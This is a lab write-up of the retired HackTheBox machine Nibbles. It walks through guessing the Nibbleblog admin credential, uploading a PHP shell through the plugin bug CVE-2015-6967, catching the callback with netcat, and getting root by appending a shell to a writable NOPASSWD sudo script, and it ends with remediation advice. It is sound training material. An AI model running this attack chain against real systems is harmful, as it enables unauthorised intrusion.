HTB Nibbles: Nibbleblog upload RCE and a sudo script to root

retired-machineeasy

Nibbles is a retired HackTheBox easy Linux machine built around Nibbleblog, a tiny CMS. Synopsis: guessed admin creds, a plugin upload that takes PHP (CVE-2015-6967), then a NOPASSWD monitor.sh that hands over root.

$ Enumeration — CMS plus defaults

# bash: find the blog, try defaults
nmap -sC -sV 10.10.10.75
gobuster dir -u http://10.10.10.75 -w common.txt   # -> /nibbleblog/
# admin login: admin:nibbles

Apache plus SSH, and gobuster finds /nibbleblog/. The admin login falls to the classic weak credential admin:nibbles. Default CMS creds are still a foothold in the wild.

$ Foothold — CVE-2015-6967 plugin upload

# bash: catch the plugin shell
# logged in as admin -> Plugins -> My image -> upload shell.php disguised as image
# browse to http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
nc -lvnp 4444

Nibbleblog 4.0.3 lets an authenticated admin upload plugin files, and the my_image plugin accepts PHP disguised as an image. Browse to the uploaded file and catch the callback as the nibbler web user.

$ Privilege escalation — writable NOPASSWD script

# bash: poison monitor.sh, sudo it
sudo -l   # (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
ls -l ~/personal/stuff/monitor.sh   # writable!
echo "/bin/bash" >> ~/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
id   # uid=0(root)

The script itself is writable — append a shell payload and run it with sudo. NOPASSWD on a modifiable script is root by delegation. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Fuzzing for exotic RCE before trying the login (the creds are the intended door) and uploading a raw .php file (follow the plugin upload flow exactly).

$ Remediation notes

Patch or replace end-of-life CMS software, enforce strong unique admin passwords, and never grant NOPASSWD sudo on scripts non-root users can modify. Written by Lucky Thandel.
